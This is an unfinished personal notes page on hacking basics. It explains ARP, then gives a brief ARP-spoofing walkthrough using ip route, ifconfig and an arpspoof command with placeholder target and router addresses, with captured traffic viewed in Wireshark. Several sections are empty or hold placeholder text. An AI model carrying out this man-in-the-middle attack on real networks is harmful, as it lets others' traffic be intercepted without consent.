# Hacking

#### "Understand computers so well that you can make them do things they were not supposed to"

# Table of Contents
* [Cryptography](#cryptography)
	* [Encryption](#encryption)
* [Network](#network)
	* [IP Forwarding](#ip-forwarding)
	* [Address Resolution Protocol (ARP)](#address-resolution-protocol-arp)
	* [ARP Spoofing](#arp-spoofing)
* [Tools](#tools)
	* [Nmap](#nmap)
	* [Wireshark](#wireshark)

***

# Cryptography

## Encryption


***
# Network

## IP Forwarding
lorem ipsum

## Address Resolution Protocol (ARP)

When a computer wants to send a package to another device, it needs it's **IP address** and **Mac address**. To get the device's Mac address, it broadcasts and ARP request to the network, asking devices for the Mac address of that specific IP.

The device will get that request and send a response, specifying the data needed. These values are stored in an **ARP Table**

**Request:**
~~~bash
Who has 192.168.1.2? Tell 192.168.1.1
~~~

**Response**:
~~~bash
192.168.1.2 is at 00:0a:95:9d:68:16
~~~

## ARP Spoofing

You can take advantage of ARP to spoof communication between a computer and the router, acting as a **man in the middle**. To do this, we continuously send **arp responses** telling the victim device that the **mac address** has changed, passing our own mac address as the new one.

Ensure that you have [IP Forwarding](#ip-forwarding) enabled.

Find the IP of the router:
~~~bash
ip route
~~~

Check what interface you are using to do the attack:
~~~bash
ifconfig
~~~

Start the attack (you can find the target's ip with [Nmap](#nmap):
~~~bash
arpspoof -i <interface> -t <target ip> -r <router ip>
~~~

You can then see the data packages with [Wireshark](#wireshark).

#### How to avoid



***

## This will be another header
